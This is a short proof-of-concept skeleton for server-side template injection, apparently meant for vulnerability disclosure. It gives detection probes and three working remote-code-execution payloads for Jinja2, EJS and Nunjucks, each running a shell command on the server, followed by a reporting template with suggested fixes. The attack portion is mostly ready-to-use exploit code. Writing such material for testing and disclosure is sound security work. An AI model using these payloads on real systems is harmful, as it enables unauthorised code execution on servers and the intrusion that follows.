# PoC Skeleton -- SSTI

## Detection (Universal)

```
# Step 1: Test for template rendering
Input: {{7*7}}
Expected output: 49

# Step 2: Identify engine
Input: {{7*'7'}}
Jinja2: 7777777
Twig: 49
Unknown: error or literal output
```

## Jinja2 RCE

```python
#!/usr/bin/env python3
"""
CVE-CANDIDATE: SSTI in [package-name]
CWE: CWE-1336 (Server-Side Template Injection)
CVSS: 9.8 CRITICAL
"""
from jinja2 import Environment

env = Environment()
# User input used as template string
template = env.from_string(
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
)
result = template.render()
print(f"[+] RCE result: {result}")
```

## EJS RCE

```js
const ejs = require('ejs');

// User input used as template string
const payload = "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>";
const result = ejs.render(payload);
console.log('[+] RCE result:', result);
```

## Nunjucks RCE

```js
const nunjucks = require('nunjucks');

const payload = "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id').toString()\")()}}";
const result = nunjucks.renderString(payload);
console.log('[+] RCE result:', result);
```

## Reporting Template

```
## Vulnerability: SSTI in [function]

**File**: `src/[file].js:LINE`
**Sink**: Template compilation at line LINE
**Source**: User input via [parameter]
**Template engine**: [EJS/Nunjucks/Jinja2/etc.]
**Data flow**: [entry] -> [processing] -> template.render(user_input)

### Key Issue
User input is passed as the TEMPLATE STRING (first argument),
not as template variables (second argument).

### Impact
Remote Code Execution. The attacker can inject template directives
that execute arbitrary code on the server.

### Suggested Fix
- Load templates from files, not user input
- Pass user input as template variables/context only
- If user-defined templates are required, use a sandboxed engine
```
